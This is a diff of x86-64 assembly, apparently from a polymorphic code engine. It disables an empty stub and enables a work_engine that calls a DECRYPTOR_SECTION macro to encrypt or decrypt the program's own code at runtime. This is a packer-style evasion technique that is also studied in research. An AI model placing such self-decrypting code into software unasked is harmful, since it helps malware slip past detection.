@@ -1,4 +1,4 @@
-; %include "include.asm.inc"
+%include "template.asm.inc"
 
 extern main
 extern polymorphic
@@ -70,33 +70,33 @@ _start:             ; Global entry point
 
 
 
-work_engine:
-;create stack frame
-push rbp
-mov  rbp, rsp
-sub  rsp, 0x18
-push rbx
-push r12
-push r13
-push r14
-push r15
-
-
-
-
-xor rax,rax 
-; this will ensure rax = 0 , means completed without error
-pop r15
-pop r14
-pop r13
-pop r12
-pop rbx
-mov rsp, rbp
-pop rbp
-ret
-
-
 ; work_engine:
-; 	; there is automatic calculation happening inside DECRYPTOR_SECTION function which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
-;     DECRYPTOR_SECTION main, _start
-;     ret
+; ;create stack frame
+; push rbp
+; mov  rbp, rsp
+; sub  rsp, 0x18
+; push rbx
+; push r12
+; push r13
+; push r14
+; push r15
+
+
+
+
+; xor rax,rax 
+; ; this will ensure rax = 0 , means completed without error
+; pop r15
+; pop r14
+; pop r13
+; pop r12
+; pop rbx
+; mov rsp, rbp
+; pop rbp
+; ret
+
+
+work_engine:
+	; there is automatic calculation happening inside DECRYPTOR_SECTION function which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
+    DECRYPTOR_SECTION main, _start
+    ret
